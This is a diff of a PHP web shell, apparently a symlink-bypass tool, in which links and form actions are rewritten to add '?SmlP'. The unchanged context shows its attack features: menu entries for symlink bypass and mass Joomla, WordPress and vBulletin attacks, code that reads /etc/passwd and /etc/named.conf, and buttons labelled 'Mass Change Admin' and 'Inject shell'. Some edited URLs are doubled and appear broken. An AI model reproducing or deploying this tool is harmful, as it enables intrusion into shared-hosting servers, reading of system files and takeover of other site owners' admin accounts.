@@ -712,25 +712,25 @@ echo '<div style="-moz-border-radius: webkit-border-radius: 10px 5px 10px 5px; b
 
 [<a href="?"> Home </a>]
 
-[<a href="?sws=sym"> User & Domains & Symlink </a>]
+[<a href="?SmlP?sws=sym"> User & Domains & Symlink </a>]
 
-[<a href="?sws=sec"> Domains & Script </a>]
+[<a href="?SmlP?sws=sec"> Domains & Script </a>]
 
-[ <a href="?sws=file"> Symlink File </a>]
+[ <a href="?SmlP?sws=file"> Symlink File </a>]
 
-[<a href="?sws=passwd"> Symlink Bypass </a>]
+[<a href="?SmlP?sws=passwd"> Symlink Bypass </a>]
 
 <br /><br />
 
-[ <a href="?sws=read"> Bypass Read </a>]
+[ <a href="?SmlP?sws=read"> Bypass Read </a>]
 
-[ <a href="?sws=joomla"> Mass Joomla </a>]
+[ <a href="?SmlP?sws=joomla"> Mass Joomla </a>]
 
-[ <a href="?sws=wp"> Mass WordPress </a>]
+[ <a href="?SmlP?sws=wp"> Mass WordPress </a>]
 
-[ <a href="?sws=vb"> Mass vBulletin </a>]
+[ <a href="?SmlP?sws=vb"> Mass vBulletin </a>]
 
-[ <a href="?sws=help"> Help </a>]
+[ <a href="?SmlP?sws=help"> Help </a>]
 
 <br /></div><br />
 
@@ -768,7 +768,7 @@ $d00m = @file("named.txt");
 if(!$d00m)
 {
 
-die ("<meta http-equiv='refresh' content='0; url=?sws=read'/>");
+die ("<meta http-equiv='refresh' content='0; url=?SmlP?sws=read'/>");
 }
 else
 
@@ -962,7 +962,7 @@ $d00m = @file("named.txt");
 if(!$d00m)
 {
 
-die ("<meta http-equiv='refresh' content='0; url=?sws=read'/>");
+die ("<meta http-equiv='refresh' content='0; url=?SmlP?sws=read'/>");
 }
 else
 
@@ -1086,7 +1086,7 @@ break;
 case 'read':
 
 echo "read /etc/named.conf";
-echo "<br /><br /><form method='post' action='?sws=read&save=1'><textarea cols='80' rows='20' name='file'>";
+echo "<br /><br /><form method='post' action='?SmlP?sws=read&save=1'><textarea cols='80' rows='20' name='file'>";
 flush();
 flush();
 
@@ -1235,7 +1235,7 @@ die ("</tr></div>");
 
 
 echo "read /etc/passwd";
-echo "<br /><br /><form method='post' action='?sws=passwd&save=1'><textarea cols='80' rows='20' name='file'>";
+echo "<br /><br /><form method='post' action='?SmlP?SmlP?sws=passwd&save=1'><textarea cols='80' rows='20' name='file'>";
 flush();
 
 $file = '/etc/passwd';
@@ -1383,13 +1383,13 @@ $d00m = file("named.txt");
 if(!$d00m)
 {
 
-die ("<meta http-equiv='refresh' content='0; url=?sws=read'/>");
+die ("<meta http-equiv='refresh' content='0; url=?SmlP?sws=read'/>");
 }
 else
 
 {
 echo "<div class='tmp'>
-<form method='POST' action='$pg?sws=joomla'>
+<form method='POST' action='$pg?SmlP?sws=joomla'>
 <input type='submit' value='Mass ching Admin' />
 <input type='hidden' value='1' name='s' />
 </form><br /><br />
@@ -1593,13 +1593,13 @@ $d00m = @file("named.txt");
 if(!$d00m)
 {
 
-die ("<meta http-equiv='refresh' content='0; url=?sws=read'/>");
+die ("<meta http-equiv='refresh' content='0; url=?SmlP?sws=read'/>");
 }
 else
 
 {
 echo "<div class='tmp'>
-<form method='POST' action='$pg?sws=wp'>
+<form method='POST' action='$pg?SmlP?sws=wp'>
 <input type='submit' value='Mass Change Admin' />
 <input type='hidden' value='1' name='s' />
 </form>
@@ -1800,13 +1800,13 @@ $d00m = file("named.txt");
 if(!$d00m)
 {
 
-die ("<meta http-equiv='refresh' content='0; url=?sws=read'/>");
+die ("<meta http-equiv='refresh' content='0; url=?SmlP?sws=read'/>");
 }
 else
 
 {
 echo "<div class='tmp'>
-<form method='POST' action='$pg?sws=vb'>
+<form method='POST' action='$pg?SmlP?sws=vb'>
 <input type='submit' value='Inject shell' />
 <input type='hidden' value='1' name='s' />
 </form>
